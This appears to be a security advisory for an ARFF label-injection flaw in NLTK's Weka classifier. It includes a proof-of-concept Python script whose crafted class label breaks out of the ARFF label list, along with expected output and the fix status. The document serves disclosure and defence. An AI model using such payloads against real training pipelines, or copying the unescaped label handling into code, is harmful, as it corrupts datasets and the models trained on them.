DescriptionSummarynltk.classify.weka.ARFF_Formatter writes class labels directly into the Weka ARFF @ATTRIBUTE '-label-' {...} declaration without any ARFF quoting or escaping. An attacker who can contribute class labels to a training dataset can include ARFF metacharacters such as }, newlines, @ATTRIBUTE, and @DATA to break out of the nominal label list and inject attacker‑controlled ARFF schema and data directives.This vulnerability is reachable in any application that calls WekaClassifier.train() or ARFF_Formatter.from_train() with attacker‑influenced training data. The victim does not need to manually edit the ARFF file; the normal training workflow writes the malformed ARFF automatically.Technical DetailsThe vulnerable code path is:WekaClassifier.train() calls ARFF_Formatter.from_train(featuresets).from_train() extracts labels from the training data and passes them to ARFF_Formatter(labels, features).header_section() uses ",".join(self._labels) directly, embedding attacker‑controlled strings into the ARFF header without sanitization.Because the label names are not escaped, a label containing safe}
@ATTRIBUTE injected NUMERIC
@DATA
0,owned
% will close the label set, inject a new attribute, start a premature data section, and comment out the remaining header.Proof of ConceptThe following self‑contained Python script demonstrates the vulnerability. It requires only NLTK and does not need Weka to be installed, because the attack is carried out purely by generating the ARFF string.from nltk.classify.weka import ARFF_Formatter# Attacker‑controlled label containing ARFF metacharacters.# The `}` closes the label set, the `@ATTRIBUTE` injects a new attribute,# `@DATA` starts the data section early, and `%` comments out the rest.malicious_label = "safe}
@ATTRIBUTE injected NUMERIC
@DATA
0,owned
%"featuresets = [    ({"f": "benign"}, "legit"),          # legitimate example    ({"f": "payload"}, malicious_label), # attacker's example]# NLTK builds the formatter from the training dataformatter = ARFF_Formatter.from_train(featuresets)# Generate the ARFF string – this is what would be written to the training filearff = formatter.format(featuresets)# Verify that the injection succeededassert "@ATTRIBUTE injected NUMERIC" in arff, "Injected attribute not found"assert "@DATA
0,owned" in arff, "Injected data row not found"print("=== Injected ARFF (excerpt) ===")for line in arff.splitlines()[5:12]:    print(line)Expected output:=== Injected ARFF (excerpt) ===@ATTRIBUTE 'f' STRING@ATTRIBUTE '-label-' {legit,safe}@ATTRIBUTE injected NUMERIC@DATA0,owned%Explanation of the injection:· The label safe} closes the nominal label set {legit,safe} prematurely.· The following lines (@ATTRIBUTE injected NUMERIC, @DATA, 0,owned) are then parsed as legitimate ARFF directives, not as part of the label name.· The % at the end comments out the remaining header lines that NLTK would have appended, preventing syntax errors.References· CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component· Huntr report  https://huntr.com/bounties/bc7085e7-1caf-40c7-b406-a5099ce44072· Weka ARFF format documentationFix status (2026-09-28)Status: MERGED on develop (unreleased; v3.10.3 of 2026-08-12 predates the fix).PR: #3768 "Fix ARFF label injection in Weka classifier" (ekaf), merged 2026-08-24, merge commit e0a857f52 on develop. Fix commit: 56031eabc. Defence in depth: 0e1d6bf87 (PR #3863, ARFF values formatted from their type rather than caller str/repr).Probe: nltk/test/unit/security_probes/ghsa_9ffx_rrgx_mhgx.py (added on #3768); verdict on develop 2fa3f48fe: FIXED (ARFF labels, values, and attribute names sanitized).Release: none yet; no release tag contains 56031eabc.Referenceshttps://github.com/nltk/nltk/security/advisories/GHSA-9ffx-rrgx-mhgxhttps://nvd.nist.gov/vuln/detail/CVE-2026-129221https://github.com/nltk/nltk/pull/3768https://github.com/nltk/nltk/commit/56031eabc1ac6e5a109cb78bb18d10e0b7589594https://github.com/nltk/nltk/releases/tag/v3.10.4https://github.com/advisories/GHSA-9ffx-rrgx-mhgx
